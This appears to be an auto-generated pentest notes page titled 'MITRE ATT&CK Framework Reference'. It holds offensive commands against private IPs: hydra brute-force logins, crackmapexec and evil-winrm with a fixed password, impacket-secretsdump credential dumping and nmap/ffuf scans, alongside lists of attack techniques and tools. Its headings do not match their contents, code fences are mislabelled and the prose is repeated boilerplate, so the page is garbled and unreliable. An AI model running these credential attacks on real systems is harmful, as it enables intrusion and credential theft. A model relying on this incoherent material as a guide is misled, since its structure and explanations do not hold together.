---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, windows, linux, oscp, networking"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-653.html"
URL_IMAGES: ""
Date: "2025-04-20"
Tags: "Persistence, Windows, Linux, OSCP, Networking"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-653"
Permalink: "/notes/note-mitre-att&ck-framework-reference-653.html"
BtnLabel: "Read Notes"
Pick: 0
---
## GetNPUsers

### Telnet

```powershell
nmap -sCV -p993,389,5985 10.99.217.92 -oN scan.txt
```

- `NFS No Root Squash`
- `Writable PATH`
- `smbclient`
- `CSRF`
- `SSRF`
- `sqlmap`

Lateral movement was facilitated by reusing discovered credentials across services. The service was running without proper input validation, leading to injection vulnerabilities.

> **Note:** SUID Binary was identified as the primary attack vector in this scenario.

## SUID Binary

### SNMP

```bash
evil-winrm -i 10.51.41.254 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.86.117.60 -u administrator -p 'P@ssw0rd!' --shares
```

- `msfvenom`
- `Golden Ticket`
- `Pass the Ticket`
- `pwncat`
- `Local File Inclusion`

Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Constrained Delegation

### wmiexec

- `Open Redirect`
- `secretsdump`
- `netcat`

- `NFS No Root Squash`
- `ACL Abuse`
- `enum4linux`

```bash
feroxbuster -h
nmap -sCV -p993,3306,21 10.72.141.107 -oN scan.txt
nmap -sCV -p3389,1433,80 10.59.153.183 -oN scan.txt
```

The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service. The application stored sensitive credentials in an unencrypted configuration file.

## msfvenom

### Kerberoasting

```python
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.15.125 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.104.5.120
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.41.116.152 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.62.47.149 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine.

- `DLL Hijacking`
- `Docker Escape`
- `mimikatz`
- `metasploit`
- `wmiexec`

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

## DLL Hijacking

### NTLM Relay

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.99.208.210/FUZZ
```

```python
crackmapexec smb 10.75.249.39 -u administrator -p 'P@ssw0rd!' --shares
```

- `wmiexec`
- `sqlmap`
- `AS-REP Roasting`
- `Golden Ticket`
